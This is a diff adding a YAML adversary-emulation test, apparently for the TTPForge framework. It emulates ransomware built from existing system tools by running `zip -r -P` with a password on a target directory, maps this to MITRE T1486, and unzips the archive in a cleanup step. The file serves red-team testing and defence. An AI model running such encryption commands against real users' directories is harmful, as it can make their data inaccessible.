@@ -1,0 +1,34 @@
+---
+api_version: 2.0
+uuid: 0fc4bb3a-b864-4c33-8516-9b0654324ad9
+name: "LOTL Ransomware"
+description: |
+  "Threat actors often need to utilize tools that are prexisting on the machine in order to perform TTPs. Often times threat actors are able to utilize something as simple as the `zip` command in order to encrypt files on a machine."
+
+args:
+  - name: target_dir
+    decription: The directory which we will encrypt.
+    default: /dev/shm
+  - name: encryption_key
+    description: The key which we will use to encrypt the data with.
+    default: password
+
+requirements:
+  platforms:
+    - os: linux
+
+mitre:
+  tactics:
+    - "TA0040 Impact"
+  techniques:
+    - "T1486 Data Encrypted for Impact"
+
+steps:
+  - name: encrypt_dir
+    description: Encrypt provided directory
+    inline: |
+      zip -r -P {{ .Args.encryption_key }} ttpforge.zip {{ .Args.target_dir }}
+
+    cleanup:
+      inline: |
+        unzip -o -P {{ .Args.encryption_key }} ttpforge.zip
